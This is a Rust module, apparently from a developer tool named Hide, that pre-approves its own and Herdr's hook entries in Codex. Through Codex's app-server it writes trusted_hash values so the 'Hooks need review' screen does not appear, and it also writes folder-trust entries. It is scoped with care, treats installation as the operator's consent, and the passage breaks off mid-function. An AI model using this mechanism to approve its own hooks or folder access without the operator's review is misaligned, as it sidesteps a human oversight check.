//! Codex's trust review for the hooks Hide installed (PRD codex-hook-trust).
//!
//! Codex keeps a content hash for each entry of `~/.codex/hooks.json` in
//! `~/.codex/config.toml` (`hooks.state`) and starts no entry whose hash it
//! does not hold; any new or changed entry opens a "Hooks need review" screen
//! at the next start. Installing Hide is the operator's consent to Hide's own
//! hooks, so after the kit writes or re-checks them this module records that
//! trust, through Codex's own app-server (`hooks/list` to read each entry's
//! key, hash and status, `config/batchWrite` to store `trusted_hash`).
//! Hide never computes a hash and never writes `config.toml`.
//!
//! Which entries are trusted is the one decision here and it is narrow
//! ([`select_targets`]): an entry is a target only when Codex lists it from
//! this account's `~/.codex/hooks.json` and its command is, byte for byte, the
//! command [`crate::install`] writes for that event with this kit's helper.
//! Another tool's hook, a project's, a plugin's, and an entry that merely
//! carries Hide's marker over a different command are never read for trust and
//! never changed. `enabled` is never written: a hook the operator switched
//! off in Codex stays off.
//!
//! One other tool's entries join that list, and only through the kit's record
//! (PRD codex-herdr-hook-trust): the entries Herdr's own `herdr integration
//! install codex` added when the kit ran it ([`HookEntry`], learned by
//! [`learn_herdr_entries`] from what Herdr wrote, never typed here). They are
//! matched the same way, byte for byte, by the same [`select_targets`].
//!
//! The app-server is one short child per check, owned by [`Session`]: it is
//! started through the one spawn helper, bounded by one deadline and by the
//! caller's stop flag, and ended on every exit path, success, failure and
//! timeout alike. The caller runs it on the kit worker, never under the
//! runtime lock.

use std::collections::BTreeSet;
use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, Receiver, RecvTimeoutError};
use std::time::{Duration, Instant};

use hide_platform::process::OwnedChild;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use crate::install::{codex_command, hook_matcher};
use crate::runtime::{AgentRuntime, HookEvent};

/// How long Codex gets. It answers each call in well under a second; these
/// are the bounds for one that does not.
#[derive(Clone, Copy, Debug)]
pub struct Limits {
    /// The whole check, from start to the child's end.
    pub overall: Duration,
    /// One request's share of it.
    pub request: Duration,
}

impl Limits {
    pub const DEFAULT: Self = Self {
        overall: Duration::from_secs(15),
        request: Duration::from_secs(5),
    };
}

/// How long the app-server gets to end on its own once its input is closed,
/// before its whole tree is ended.
const SHUTDOWN_GRACE: Duration = Duration::from_secs(2);

/// The longest one session with [`Limits::DEFAULT`] runs, its end included:
/// the requests, the grace to end on its own, then the reap and the reader's
/// join. A folder trust change holds Hide's lock for that long at most, so
/// one that waits for it waits this long (`crate::folder_trust`).
pub(crate) const SESSION_BOUND: Duration = Duration::from_secs(
    Limits::DEFAULT.overall.as_secs() + SHUTDOWN_GRACE.as_secs() + 2 * REAP_GRACE.as_secs(),
);

/// How often a wait looks at the caller's stop flag.
const POLL: Duration = Duration::from_millis(50);

/// The longest line, and the most output in all, read from the child. The
/// list holds a few entries; a child that writes more is not answering.
const LINE_CAP: usize = 1024 * 1024;
const OUTPUT_CAP: usize = 4 * 1024 * 1024;

/// JSON-RPC's "method not found".
const METHOD_NOT_FOUND: i64 = -32601;

/// What codex-cli 0.160.0 answers for a method outside its request list:
/// `-32600` with "Invalid request: unknown variant `<method>`, expected one
/// of ...". The same code answers a request whose parameters are wrong, so
/// the message is what tells the two apart.
const INVALID_REQUEST: i64 = -32600;

/// The most requests of Hide's that a server may make before it is judged not
/// to be answering the one Hide asked (each is refused with a write).
const MAX_SERVER_REQUESTS: usize = 16;

/// How long the child gets to be seen exiting after its tree was ended.
const REAP_GRACE: Duration = Duration::from_secs(2);

/// Whether `code` and `message` are Codex saying it has no `method`.
fn method_unknown(method: &str, code: i64, message: &str) -> bool {
    code == METHOD_NOT_FOUND
        || (code == INVALID_REQUEST && message.contains(&format!("unknown variant `{method}`")))
}

/// What one check ended as.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum TrustOutcome {
    /// This Codex has no hook trust (its app-server does not know
    /// `hooks/list`, or it has no app-server and ends before the handshake):
    /// nothing to record and nothing to show.
    Unsupported,
    /// Every entry of Hide's that needed it is trusted now; `recorded` is how
    /// many this check wrote, and zero is a check that wrote nothing.
    Trusted { recorded: usize },
    /// Codex could not be asked, or did not do what it was asked.
    Failed(TrustFailure),
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub struct TrustFailure {
    pub kind: TrustFailureKind,
    /// Codex's own words or the system's, for the log; never for the screen.
    pub detail: String,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum TrustFailureKind {
    /// The `codex` program could not be started.
    CouldNotStart,
    /// Codex started and its app-server ended or closed its output before it
    /// answered.
    Ended,
    /// Codex answered an error, or something Hide cannot read.
    Refused,
    /// Codex did not answer in time and was stopped.
    TimedOut,
    /// Codex accepted the write and the entries are still not trusted.
    Unconfirmed,
    /// Hide was quitting and stopped the child.
    Stopped,
}

impl TrustFailureKind {
    /// The few words the part's reason line carries.
    pub fn summary(self) -> &'static str {
        match self {
            Self::CouldNotStart => "it could not be started",
            Self::Ended => "it ended before it answered",
            Self::Refused => "it refused",
            Self::TimedOut => "it did not answer in time",
            Self::Unconfirmed => "it did not keep the record",
            Self::Stopped => "Hide was quitting",
        }
    }
}

impl TrustFailure {
    fn new(kind: TrustFailureKind, detail: impl Into<String>) -> Self {
        Self {
            kind,
            detail: detail.into(),
        }
    }
}

/// Records Codex's trust for the entries Hide wrote in `home`'s
/// `~/.codex/hooks.json`, where `helper` is the helper those entries run.
/// Writes nothing when every such entry is already trusted or when the file
/// holds none (the same check twice leaves `config.toml` alone).
///
/// `herdr` is what the kit recorded Herdr's integration added to that file
/// (empty unless the kit installed it); each is trusted as exactly the entry
/// the kit saw Herdr write.
pub fn trust_own_hooks<'a>(
    codex: &Path,
    home: &Path,
    helper: impl Into<crate::route::HookTarget<'a>>,
    herdr: &[HookEntry],
    stop: &AtomicBool,
) -> TrustOutcome {
    trust_own_hooks_within(codex, home, helper, herdr, stop, Limits::DEFAULT)
}

/// [`trust_own_hooks`] with the bounds named, for a caller (a test) that
/// needs a Codex that does not answer to be given up on sooner.
pub fn trust_own_hooks_within<'a>(
    codex: &Path,
    home: &Path,
    helper: impl Into<crate::route::HookTarget<'a>>,
    herdr: &[HookEntry],
    stop: &AtomicBool,
    limits: Limits,
) -> TrustOutcome {
    let hooks_json = AgentRuntime::Codex.config_path(home);
    let expected = expected_entries(helper, herdr);
    let mut session = match Session::start(codex, home, stop, limits) {
        Ok(Started::Ready(session)) => session,
        Ok(Started::Unsupported) => return TrustOutcome::Unsupported,
        Err(failure) => return TrustOutcome::Failed(failure),
    };
    let targets = match session.list(&hooks_json, &expected) {
        Ok(Listing::Targets(targets)) => targets,
        Ok(Listing::Unsupported) => return TrustOutcome::Unsupported,
        Err(failure) => return TrustOutcome::Failed(failure),
    };
    if targets.is_empty() {
        return TrustOutcome::Trusted { recorded: 0 };
    }
    if let Err(failure) = session.record(&targets) {
        return TrustOutcome::Failed(failure);
    }
    match session.list(&hooks_json, &expected) {
        Ok(Listing::Targets(left)) if left.is_empty() => TrustOutcome::Trusted {
            recorded: targets.len(),
        },
        Ok(Listing::Targets(left)) => TrustOutcome::Failed(TrustFailure::new(
            TrustFailureKind::Unconfirmed,
            format!(
                "codex accepted the write and still lists {} of {} entries as not trusted",
                left.len(),
                targets.len()
            ),
        )),
        Ok(Listing::Unsupported) => TrustOutcome::Failed(TrustFailure::new(
            TrustFailureKind::Refused,
            "codex stopped knowing hooks/list between two calls",
        )),
        Err(failure) => TrustOutcome::Failed(failure),
    }
}

/// What Codex lists for one entry Hide writes.
#[derive(Clone, Debug, Eq, PartialEq)]
struct Expected {
    /// Codex names an event the way the wire does: `sessionStart`.
    event: String,
    handler_type: String,
    command: String,
    matcher: Option<String>,
}

/// Hide's own six entries, then the entries the kit recorded Herdr writing.
fn expected_entries<'a>(
    helper: impl Into<crate::route::HookTarget<'a>>,
    herdr: &[HookEntry],
) -> Vec<Expected> {
    let helper = helper.into();
    HookEvent::ALL
        .into_iter()
        .map(|event| Expected {
            event: wire_event_name(event.name()),
            handler_type: COMMAND_HANDLER.to_owned(),
            command: codex_command(helper, event),
            matcher: hook_matcher(AgentRuntime::Codex, event).map(str::to_owned),
        })
        .chain(
            herdr
                .iter()
                .filter(|entry| entry.handler_type == COMMAND_HANDLER)
                .map(|entry| Expected {
                    event: wire_event_name(&entry.event),
                    handler_type: entry.handler_type.clone(),
                    command: entry.command.clone(),
                    matcher: entry.matcher.clone(),
                }),
        )
        .collect()
}

/// `hooks.json` spells an event `SessionStart`; the wire says `sessionStart`.
fn wire_event_name(name: &str) -> String {
    let mut characters = name.chars();
    match characters.next() {
        Some(first) => first.to_ascii_lowercase().to_string() + characters.as_str(),
        None => String::new(),
    }
}

/// The handler type of every entry Hide writes.
const COMMAND_HANDLER: &str = "command";

/// One hook entry of `~/.codex/hooks.json`, as much of it as Codex's trust
/// keys on: the event (spelled as the file does), the matcher of its group,
/// its handler type and its command.
#[derive(Clone, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
pub struct HookEntry {
    pub event: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub matcher: Option<String>,
    pub handler_type: String,
    pub command: String,
}

/// The most entries one integration install may add before the kit refuses to
/// learn them: Herdr's Codex integration adds one (0.9.1), and a call that
/// adds a pile is not one whose entries Hide vouches for.
pub const MAX_LEARNED_ENTRIES: usize = 4;

/// Every command-handler entry of the account's `~/.codex/hooks.json`, or why the
/// file cannot be read (a missing or empty file is no entries).
pub fn hook_entries(home: &Path) -> Result<BTreeSet<HookEntry>, String> {
    let path = AgentRuntime::Codex.config_path(home);
    let document = crate::install::read_document(&path)
        .map_err(|failure| failure.message())?
        .unwrap_or_else(|| crate::install::HookDocument::new(Value::Null));
    let mut found = BTreeSet::new();
    let Some(events) = document.get("hooks").and_then(Value::as_object) else {
        return Ok(found);
    };
    for (event, groups) in events {
        for group in groups.as_array().into_iter().flatten() {
            let matcher = group
                .get("matcher")
                .and_then(Value::as_str)
                .map(str::to_owned);
            for hook in group
                .get("hooks")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
            {
                let (Some(COMMAND_HANDLER), Some(command)) = (
                    hook.get("type").and_then(Value::as_str),
                    hook.get("command").and_then(Value::as_str),
                ) else {
                    continue;
                };
                found.insert(HookEntry {
                    event: event.clone(),
                    matcher: matcher.clone(),
                    handler_type: COMMAND_HANDLER.to_owned(),
                    command: command.to_owned(),
                });
            }
        }
    }
    Ok(found)
}

/// Why an install teaches the kit nothing about what Herdr wrote. The record
/// is left as it was in either case.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum NotLearned {
    /// The install added more than [`MAX_LEARNED_ENTRIES`] entries.
    TooMany(usize),
    /// Entries that were in the file before the call, and are not ones the kit
    /// recorded Herdr writing, are gone after it: the file changed in a way an
    /// integration install does not change it, so something else wrote it.
    Changed(usize),
}

impl std::fmt::Display for NotLearned {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TooMany(count) => write!(
                formatter,
                "the install added {count} entries, more than the {MAX_LEARNED_ENTRIES} a Herdr integration adds"
            ),
            Self::Changed(count) => write!(
                formatter,
                "{count} entries that were there before the install changed or are gone"
            ),
        }
    }
}

/// What Herdr's integration install wrote, out of the entries the file held
/// before the call and after it, given what the kit had recorded earlier.
///
/// The file may only have gained entries, or lost entries the kit already
/// recorded as Herdr's (Herdr replacing its own older command): any other
/// removal or edit means a writer other than Herdr's install touched the file
/// in the window, and nothing is learned. The entries the call added are
/// Herdr's, and so are the recorded entries still in the file (Herdr leaves an
/// entry it already wrote alone and only replaces its script), so an accepted
/// learn drops the entries that are gone. More than [`MAX_LEARNED_ENTRIES`]
/// added is refused too, and a refusal leaves the record as it was.
pub fn learn_herdr_entries(
    before: &BTreeSet<HookEntry>,
    after: &BTreeSet<HookEntry>,
    recorded: &[HookEntry],
) -> Result<Vec<HookEntry>, NotLearned> {
    let foreign_changes = before
        .difference(after)
        .filter(|entry| !recorded.contains(entry))
        .count();
    if foreign_changes > 0 {
        return Err(NotLearned::Changed(foreign_changes));
    }
    let added: Vec<&HookEntry> = after.difference(before).collect();
    if added.len() > MAX_LEARNED_ENTRIES {
        return Err(NotLearned::TooMany(added.len()));
    }
    let kept = recorded.iter().filter(|entry| after.contains(*entry));
    let learned: BTreeSet<HookEntry> = added.into_iter().chain(kept).cloned().collect();
    Ok(learned.into_iter().collect())
}

/// One entry of `hooks/list`, as much of it as the decision reads.
#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Listed {
    key: String,
    event_name: String,
    #[serde(default)]
    handler_type: Option<String>,
    #[serde(default)]
    command: Option<String>,
    #[serde(default)]
    matcher: Option<String>,
    source: String,
    source_path: String,
    #[serde(default)]
    is_managed: bool,
    current_hash: String,
    trust_status: String,
}

/// An entry to record: Codex's key for it and the hash Codex computed.
#[derive(Clone, Debug, Eq, PartialEq)]
struct Target {
    key: String,
    hash: String,
}

/// The entries Hide records trust for, out of what Codex lists. This is the
/// whole of Hide's authority over Codex's review, so it asks for everything at
/// once and is narrower than it has to be:
///
/// - the entry comes from the user's own file, this account's
///   `~/.codex/hooks.json`, and is not managed (a project layer, a plugin and
///   a managed file can name the same command and are not Hide's write);
/// - its event, handler type, command and matcher are, byte for byte, one
///   Hide writes for that event with this kit's helper (a command hook; the
///   matcher `Bash|request_user_input|request_user_input_async` for `PreToolUse`, none for the rest), or one the kit
///   recorded Herdr's own integration install writing (the one other tool
///   whose entries are here, and only through that record);
/// - Codex does not trust it yet (`untrusted`, or `modified` after a change).
fn select_targets(expected: &[Expected], listed: &[Listed], hooks_json: &Path) -> Vec<Target> {
    let wanted = canonical_or_given(hooks_json);
    let mut seen = BTreeSet::new();
    listed
        .iter()
        .filter(|hook| hook.source == "user" && !hook.is_managed)
        .filter(|hook| matches!(hook.trust_status.as_str(), "untrusted" | "modified"))
        .filter(|hook| canonical_or_given(Path::new(&hook.source_path)) == wanted)
        // Codex names an entry `<file>:<event>:<group>:<hook>`; a key that
        // names another file is not this file's entry whatever else it says.
        .filter(|hook| hook.key.starts_with(&format!("{}:", hook.source_path)))
        .filter(|hook| {
            hook.command.as_deref().is_some_and(|command| {
                expected.iter().any(|wanted| {
                    wanted.event == hook.event_name
                        && hook.handler_type.as_deref() == Some(wanted.handler_type.as_str())
                        && wanted.command == command
                        && wanted.matcher == hook.matcher
                })
            })
        })
        .filter(|hook| seen.insert(hook.key.clone()))
        .map(|hook| Target {
            key: hook.key.clone(),
            hash: hook.current_hash.clone(),
        })
        .collect()
}

/// Two spellings of one file compare equal; a file that cannot be resolved is
/// compared as given, which can only fail to match.
fn canonical_or_given(path: &Path) -> PathBuf {
    hide_platform::fs::identity::canonical(path).unwrap_or_else(|_| path.to_path_buf())
}

enum Listing {
    Targets(Vec<Target>),
    Unsupported,
}

/// One line the child printed, or the end of its output.
enum Line {
    Message(Value),
    /// The output ended: the child exited or closed it.
    Eof,
    /// The child printed more than the caps allow.
    Overflow,
}

/// One owned `codex app-server` over stdio.
struct Session<'a> {
    child: OwnedChild,
    stdin: Option<ChildStdin>,
    incoming: Receiver<Line>,
    reader: Option<std::thread::JoinHandle<()>>,
    next_id: u64,
    started: Instant,
    limits: Limits,
    stop: &'a AtomicBool,
    ended: bool,
}

/// How a start ended when it did not fail.
enum Started<'a> {
    Ready(Session<'a>),
    /// Codex ended before it answered the handshake.
    Unsupported,
}

impl<'a> Session<'a> {
    /// Starts the app-server and completes the handshake. Codex is run with the
    /// account's home and its own `.codex` named outright, in an environment
    /// built rather than inherited (the login variables and nothing else), so a `CODEX_HOME` the launching shell
    /// carried never redirects whose hooks are trusted; its `PATH` is the one
    /// it was found on, so a script that runs `node` finds it. The working
    /// directory is the account's home, so no project layer is read.
    ///
    /// A Codex that ends before it answers `initialize` has no app-server to
    /// speak to (an older build whose `app-server` is not a command, or a
    /// program that is not a Codex), and that is [`Started::Unsupported`], the
    /// same answer as one that does not know `hooks/list` (D-07); a Codex that
    /// starts, speaks, and then fails stays a failure.
    fn start(
        codex: &Path,
        home: &Path,
        stop: &'a AtomicBool,
        limits: Limits,
    ) -> Result<Started<'a>, TrustFailure> {
        let path = crate::diagnosis::cli_path(home).ok_or_else(|| {
            TrustFailure::new(
                TrustFailureKind::CouldNotStart,
                format!("a folder under {} cannot be put on a PATH", home.display()),
            )
        })?;
        let mut command = Command::new(codex);
        hide_platform::process::restrict_to_login_environment(&mut command);
        command
            .arg("app-server")
            .current_dir(home)
            .env(hide_platform::host::HOME_VARIABLE, home)
            .env("CODEX_HOME", AgentRuntime::Codex.home_directory(home))
            .env("PATH", path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null());
        let mut child = OwnedChild::spawn(&mut command).map_err(|error| {
            TrustFailure::new(
                TrustFailureKind::CouldNotStart,
                format!("{} could not start: {error}", codex.display()),
            )
        })?;
        let stdin = child.take_stdin();
        let stdout = child.take_stdout();
        let (Some(stdin), Some(stdout)) = (stdin, stdout) else {
            return Err(TrustFailure::new(
                TrustFailureKind::CouldNotStart,
                "codex app-server has no standard input or output",
            ));
        };
        let (sender, incoming) = mpsc::channel();
        let reader = std::thread::Builder::new()
            .name("codex-trust-reader".into())
            .spawn(move || read_lines(stdout, &sender))
            .map_err(|error| {
                TrustFailure::new(
                    TrustFailureKind::CouldNotStart,
                    format!("the reader thread could not start: {error}"),
                )
            })?;
        let mut session = Self {
            child,
            stdin: Some(stdin),
            incoming,
            reader: Some(reader),
            next_id: 0,
            started: Instant::now(),
            limits,
            stop,
            ended: false,
        };
        match session.request(
            "initialize",
            json!({"clientInfo": {"name": "hide-agent-hooks", "version": env!("CARGO_PKG_VERSION")}}),
        ) {
            Ok(_) => {}
            Err(Failed::Gone(_)) => return Ok(Started::Unsupported),
            Err(failure) => return Err(failure.into_failure()),
        }
        session
            .write(&json!({"jsonrpc": "2.0", "method": "initialized", "params": {}}))
            .map_err(Failed::into_failure)?;
        Ok(Started::Ready(session))
    }

    /// Reads Codex's hooks and picks the ones to record.
    fn list(&mut self, hooks_json: &Path, expected: &[Expected]) -> Result<Listing, TrustFailure> {
        let answer = match self.request("hooks/list", json!({})) {
            Ok(answer) => answer,
            Err(Failed::Rejected {
                method,
                code,
                message,
            }) if method_unknown(method, code, &message) => return Ok(Listing::Unsupported),
            Err(failed) => return Err(failed.into_failure()),
        };
        let answer = hooks_of(&answer).map_err(|detail| {
            TrustFailure::new(
                TrustFailureKind::Refused,
                format!("hooks/list answered something Hide cannot read: {detail}"),
            )
        })?;
        // Codex could not use what Hide wrote: its entries are missing from
        // the list, so "nothing to record" would be a wrong answer. Observed
        // from codex-cli 0.160.0: a hooks.json it cannot parse is a warning
        // (`failed to parse hooks config <path>: ...`) with an empty list,
        // and only a broken `config.toml` fills `errors`. Other warnings
        // ("skipping prompt hook in <path>") are about other tools' entries.
        if let Some(error) = answer.errors.first() {
            return Err(TrustFailure::new(
                TrustFailureKind::Refused,
                format!(
                    "codex reports {} as unusable: {}",
                    error.path, error.message
                ),
            ));
        }
        let spellings = [
            hooks_json.display().to_string(),
            canonical_or_given(hooks_json).display().to_string(),
        ];
        if let Some(warning) = answer.warnings.iter().find(|warning| {
            warning.contains("failed to parse hooks config")
                && spellings.iter().any(|path| warning.contains(path.as_str()))
        }) {
            return Err(TrustFailure::new(
                TrustFailureKind::Refused,
                format!("codex could not parse Hide's hook file: {warning}"),
            ));
        }
        let listed = answer.hooks;
        Ok(Listing::Targets(select_targets(
            expected, &listed, hooks_json,
        )))
    }

    /// Stores `trusted_hash` for each target in one write. The entries go in as
    /// table keys of the `hooks.state` object, so the key's path and colons are
    /// never a dotted key path Hide would have to quote, and an upsert leaves
    /// each table's other fields (`enabled`) as they are.
    fn record(&mut self, targets: &[Target]) -> Result<(), TrustFailure> {
        let state: serde_json::Map<String, Value> = targets
            .iter()
            .map(|target| (target.key.clone(), json!({"trusted_hash": target.hash})))
            .collect();
        self.request(
            "config/batchWrite",
            json!({"edits": [{
                "keyPath": "hooks.state",
                "mergeStrategy": "upsert",
                "value": state,
            }]}),
        )
        .map(|_| ())
        .map_err(Failed::into_failure)
    }

    /// The user layer's `projects` table, read with `config/read` from the
    /// account's home, so no project layer is read.
    fn projects(&mut self) -> Result<Projects, TrustFailure> {
        let answer = self
            .request("config/read", json!({"includeLayers": true}))
            .map_err(Failed::into_failure)?;
        let unreadable = |detail: &str| {
            TrustFailure::new(
                TrustFailureKind::Refused,
                format!("config/read answered something Hide cannot read: {detail}"),
            )
        };
        let layers = answer
            .get("layers")
            .and_then(Value::as_array)
            .ok_or_else(|| unreadable("there is no layers list"))?;
        let Some(user) = layers
            .iter()
            .find(|layer| layer.pointer("/name/type").and_then(Value::as_str) == Some("user"))
        else {
            return Ok(Projects {
                table: serde_json::Map::new(),
                version: None,
            });
        };
        let version = user
            .get("version")
            .and_then(Value::as_str)
            .ok_or_else(|| unreadable("the user layer has no version"))?;
        let table = match user.pointer("/config/projects") {
            None => serde_json::Map::new(),
            Some(Value::Object(table)) => table.clone(),
            Some(_) => return Err(unreadable("projects is not a table")),
        };
        Ok(Projects {
            table,
            version: Some(version.to_owned()),
        })
    }

    /// One `config/batchWrite` of `edits` to the user layer read at
    /// `version`. Codex answers `okOverridden` when a managed layer decides
    /// the value instead, which leaves the write without effect.
    fn write_projects(
        &mut self,
        version: Option<&str>,
        edits: Vec<Value>,
    ) -> Result<(), TrustFailure> {
        let answer = self
            .request(
                "config/batchWrite",
                json!({"edits": edits, "expectedVersion": version}),
            )
            .map_err(Failed::into_failure)?;
        match answer.get("status").and_then(Value::as_str) {
            Some("ok") => Ok(()),
            Some("okOverridden") => Err(TrustFailure::new(
                TrustFailureKind::Unconfirmed,
                "a managed Codex configuration decides that folder's trust instead",
            )),
            _ => Err(TrustFailure::new(
                TrustFailureKind::Refused,
                format!("config/batchWrite answered something Hide cannot read: {answer}"),
            )),
        }
    }

    fn write(&mut self, message: &Value) -> Result<(), Failed> {
        let mut line = serde_json::to_vec(message)
            .map_err(|error| Failed::Gone(format!("a request could not be encoded: {error}")))?;
        line.push(b'\n');
        let stdin = self
            .stdin
            .as_mut()
            .ok_or_else(|| Failed::Gone("codex app-server's input is closed".to_owned()))?;
        stdin
            .write_all(&line)
            .and_then(|()| stdin.flush())
            .map_err(|error| {
                Failed::Gone(format!("codex app-server cannot be written to: {error}"))
            })
    }

    /// One request and its answer. A request the server declines is
    /// [`Failed::Rejected`]; no answer in time is [`Failed::TimedOut`].
    fn request(&mut self, method: &'static str, params: Value) -> Result<Value, Failed> {
        self.next_id += 1;
        let id = self.next_id;
        self.write(&json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}))?;
        let request_end = Instant::now() + self.limits.request;
        let mut refused = 0usize;
        loop {
            if self.stop.load(Ordering::Relaxed) {
                return Err(Failed::Stopped);
            }
            let now = Instant::now();
            if now >= request_end || self.started + self.limits.overall <= now {
                return Err(Failed::TimedOut { method });
            }
            let wait = POLL.min(request_end - now);
            let message = match self.incoming.recv_timeout(wait) {
                Ok(Line::Message(message)) => message,
                Ok(Line::Eof) | Err(RecvTimeoutError::Disconnected) => {
                    return Err(Failed::Gone(format!(
                        "codex app-server ended before it answered {method}"
                    )));
                }
                Ok(Line::Overflow) => {
                    return Err(Failed::Unreadable(format!(
                        "codex app-server printed more than {OUTPUT_CAP} bytes before it answered {method}"
                    )));
                }
                Err(RecvTimeoutError::Timeout) => continue,
            };
            if message.get("id").and_then(Value::as_u64) == Some(id)
                && message.get("method").is_none()
            {
                if let Some(error) = message.get("error") {
                    return Err(Failed::Rejected {
                        method,
                        code: error.get("code").and_then(Value::as_i64).unwrap_or(0),
                        message: error
                            .get("message")
                            .and_then(Value::as_str)
                            .unwrap_or("")
                            .to_owned(),
                    });
                }
                return Ok(message.get("result").cloned().unwrap_or(Value::Null));
            }
            // A request the server makes of its client (an approval): Hide
            // serves none, and answering keeps the server from waiting on it.
            if let (Some(server_id), Some(_)) = (message.get("id"), message.get("method")) {
                refused += 1;
                if refused > MAX_SERVER_REQUESTS {
                    return Err(Failed::Unreadable(format!(
                        "codex app-server made more than {MAX_SERVER_REQUESTS} requests of Hide before it answered {method}"
                    )));
                }
                let refusal = json!({
                    "jsonrpc": "2.0",
                    "id": server_id,
                    "error": {"code": METHOD_NOT_FOUND, "message": "hide does not serve requests"},
                });
                self.write(&refusal)?;
            }
        }
    }

    /// Ends the child through one path: close its input (its own shutdown
    /// signal), give it a moment, then end its whole tree, reap it and join
    /// the reader. Every exit goes through here, by `Drop` when not before.
    fn end(&mut self) {
        if std::mem::replace(&mut self.ended, true) {
            return;
        }
        self.stdin = None;
        let grace = Instant::now() + SHUTDOWN_GRACE;
        while Instant::now() < grace {
            match self.incoming.recv_timeout(POLL) {
                Ok(Line::Eof) | Err(RecvTimeoutError::Disconnected) => break,
                Ok(_) | Err(RecvTimeoutError::Timeout) => {}
            }

            if self.stop.load(Ordering::Relaxed) {
                break;
            }
        }
        let killed = self.child.kill_tree().is_ok();
        // Seen to exit, within a bound: a kill that failed leaves the child
        // to `OwnedChild`'s own drop, never to a wait with no end.
        let reaped = killed && self.reaped_within(REAP_GRACE);
        // The reader ends at the end of the child's output. A process that
        // left the child's tree can hold that output open, so the reader is
        // joined only once it has finished, and let go of otherwise.
        if let Some(reader) = self.reader.take() {
            let deadline = Instant::now() + REAP_GRACE;
            while reaped && !reader.is_finished() && Instant::now() < deadline {
                std::thread::park_timeout(POLL);
            }
            if reader.is_finished() {
                let _ = reader.join();
            }
        }
    }

    fn reaped_within(&mut self, grace: Duration) -> bool {
        let deadline = Instant::now() + grace;
        loop {
            match self.child.try_wait() {
                Ok(Some(_)) => return true,
                Ok(None) => {}
                Err(_) => return false,
            }
            let now = Instant::now();
            if now >= deadline {
                return false;
            }
            std::thread::park_timeout(POLL.min(deadline - now));
        }
    }
}

impl Drop for Session<'_> {
    fn drop(&mut self) {
        self.end();
    }
}

/// Why one request has no answer.
enum Failed {
    Rejected {
        method: &'static str,
        code: i64,
        message: String,
    },
    TimedOut {
        method: &'static str,
    },
    /// The child or its connection is gone.
    Gone(String),
    /// The child answers with more than Hide reads.
    Unreadable(String),
    Stopped,
}

impl Failed {
    fn into_failure(self) -> TrustFailure {
        match self {
            Self::Rejected {
                method,
                code,
                message,
            } => TrustFailure::new(
                TrustFailureKind::Refused,
                format!("codex answered {method} with error {code}: {message}"),
            ),
            Self::TimedOut { method } => TrustFailure::new(
                TrustFailureKind::TimedOut,
                format!("codex app-server did not answer {method} in time and was stopped"),
            ),
            Self::Unreadable(detail) => TrustFailure::new(TrustFailureKind::Refused, detail),
            Self::Gone(detail) => TrustFailure::new(TrustFailureKind::Ended, detail),
            Self::Stopped => TrustFailure::new(
                TrustFailureKind::Stopped,
                "codex app-server was stopped because Hide is quitting",
            ),
        }
    }
}

/// The user layer's `projects` table as Codex reads it, and the layer's
/// version, which a write names so it never lands on a newer file. A Codex
/// with no `config.toml` yet has no user layer and no version.
struct Projects {
    table: serde_json::Map<String, Value>,
    version: Option<String>,
}

impl Projects {
    /// The entry Codex reads for `key`: the key as written, else, on Windows
    /// where Codex compares keys without case, the first one that matches so
    /// (`project_trust_for_lookup_key`, codex-rs 0.163.0).
    fn entry(&self, key: &str) -> Option<(&str, &serde_json::Map<String, Value>)> {
        if let Some((found, entry)) = self.table.get_key_value(key) {
            return entry.as_object().map(|entry| (found.as_str(), entry));
        }
        if !cfg!(windows) {
            return None;
        }
        let mut alike: Vec<_> = self
            .table
            .iter()
            .filter(|(found, _)| found.to_lowercase() == key)
            .collect();
        alike.sort_by_key(|(found, _)| *found);
        alike
            .first()
            .and_then(|(found, entry)| entry.as_object().map(|entry| (found.as_str(), entry)))
    }

    fn trust_level(&self, key: &str) -> Option<&str> {
        self.entry(key)?.1.get("trust_level")?.as_str()
    }
}

/// The key path of `projects."<key>"`, with the folder quoted so its dots and
/// separators stay one segment (`parse_key_path`, codex-rs 0.163.0).
fn project_key_path(key: &str, field: Option<&str>) -> String {
    let quoted = key.replace('\\', "\\\\").replace('"', "\\\"");
    match field {
        Some(field) => format!("projects.\"{quoted}\".{field}"),
        None => format!("projects.\"{quoted}\""),
    }
}

fn config_failure(home: &Path, failure: TrustFailure) -> crate::install::InstallFailure {
    crate::install::InstallFailure::NotWritable {
        path: crate::folder_trust::Agent::Codex
            .settings_path(home)
            .display()
            .to_string(),
        detail: format!("Codex {}: {}", failure.kind.summary(), failure.detail),
    }
}

/// A session for a folder trust change; a Codex with no app-server cannot
/// record one.
fn project_session<'a>(
    codex: &Path,
    home: &Path,
    stop: &'a AtomicBool,
) -> Result<Session<'a>, crate::install::InstallFailure> {
    match Session::start(codex, home, stop, Limits::DEFAULT) {
        Ok(Started::Ready(session)) => Ok(session),
        Ok(Started::Unsupported) => Err(config_failure(
            home,
            TrustFailure::new(
                TrustFailureKind::Ended,
                "this Codex has no app-server to record a folder's trust through",
            ),
        )),
        Err(failure) => Err(config_failure(home, failure)),
    }
}

/// Records Codex's trust of the folder spelled `key` through Codex's own
/// `config/batchWrite`, unless Codex already trusts it. `repository` is the
/// key of the main checkout the folder was made from: one Codex marks
/// untrusted is the operator saying no to those files, so the folder is not
/// trusted past it, and neither is a folder Codex itself marks untrusted.
/// `remember` runs once Hide knows it will write, before the write, and the
/// same write takes out Hide's trust of each folder in `gone`, whose folder no
/// longer exists.
pub(crate) fn add_project_trust(
    codex: &Path,
    home: &Path,
    stop: &AtomicBool,
    key: &str,
    repository: Option<&str>,
    gone: &[String],
    remember: &mut dyn FnMut() -> Result<(), crate::install::InstallFailure>,
